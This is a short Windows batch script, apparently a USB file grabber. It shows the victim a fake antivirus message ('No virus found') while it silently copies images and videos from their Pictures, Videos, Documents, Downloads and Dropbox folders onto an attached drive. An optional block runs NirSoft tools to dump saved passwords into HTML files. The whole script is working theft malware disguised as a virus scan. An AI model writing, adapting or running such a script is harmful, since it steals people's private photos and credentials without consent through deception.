@echo off

REM ###############################################################
REM ######################### OPTIONS #############################
REM ###############################################################

set formats=*.jpg *.png *.mp4 *.3gp *.avi

set msg1=true
set msg1text=Analyzing USB device for searching virus.

set msg2=true
set msg2text=No virus found.

set stealfiles=true
set sizemax=50000
set sizemin=100

set nirsoft=false
set soft=

REM ###############################################################
REM ############ DON'T TOUCH THIS, ONLY ADVANCED USERS ############
REM ###############################################################

set drives=B D E F G H I J K L M N O P Q R S T U V W X Y Z

set /a sizemax=%sizemax%*1024
set /a sizemin=%sizemin%*1024

IF %msg1%==true (
	MSG * %msg1text%
)

IF %stealfiles%==true (
	MKDIR data\capt\%USERNAME%
	FOR %%# IN (%DRIVES%) DO (IF Exist "%%#:\data" (
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Pictures\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Videos\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Documents\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Downloads\ %%#:\data\capt\%USERNAME%
		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Dropbox\ %%#:\data\capt\%USERNAME%
	))
)

IF %nirsoft%==true (
	MKDIR data\pss\%USERNAME%
	FOR %%I IN (%soft%) DO (
		start data/soft/%%I.exe /shtml "data\pss\%USERNAME%\%%I.html"
	)
)

IF %msg2%==true (
	MSG * %msg2text%
)

exit